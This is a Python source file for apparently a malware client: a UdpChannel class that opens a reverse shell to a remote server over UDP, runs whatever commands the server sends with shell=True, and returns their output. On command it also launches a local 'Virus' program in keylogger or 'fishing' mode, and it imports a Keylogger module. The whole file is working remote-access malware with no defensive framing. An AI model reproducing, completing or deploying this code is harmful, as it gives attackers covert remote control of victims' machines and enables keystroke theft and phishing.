import socket
import time
import os
import subprocess
import sys
import asyncio

from Keylogger import *


"""
Class designed to get commands from a remote server and execute them on the local machine.
"""
class UdpChannel:


    """
    Initializes server address and client socket.
    """
    def __init__(self, serverIP, serverPort):

        self.isRunning      = True
        self.serverAddress  = (serverIP, serverPort)
        self.client         = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)


    """
    Sends information througt the udp channel.
    """
    def sendInformation(self, information):

        self.client.sendto(str.encode(information + "\n"), self.serverAddress)


    """
    Executes a command and send back the output/error message of the command.
    """
    def executeOrder(self, order):

        if order == "bye\n":
            
            self.isRunning = False

        elif order == "keylogger\n":

            subprocess.Popen([".\Virus", "1"], stdin=None, stdout=None, stderr=None, close_fds=True)

        else:

            command = []

            if order == "fishing\n":

                command = [".\Virus", "0"]
            
            else:

                command = order.split(" ")
            
            program = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output, error = program.communicate()

            if output is not None and len(output) > 0:

                self.client.sendto(str.encode("[shell output]\n") + output + str.encode("\n"), self.serverAddress)

            if error is not None and len(error) > 0:

                self.client.sendto(str.encode("[shell error]\n") + error + str.encode("\n"), self.serverAddress)


    """
    Main loop : sends a first message to let the server know the client is available then wait for orders to execute.
    """
    def runReverseShell(self):

        self.client.sendto(str.encode("[reverse shell activated]\n"), self.serverAddress)

        while self.isRunning:
            
            self.client.sendto(str.encode("\n>>"), self.serverAddress)
            self.executeOrder(self.client.recvfrom(1024)[0].decode())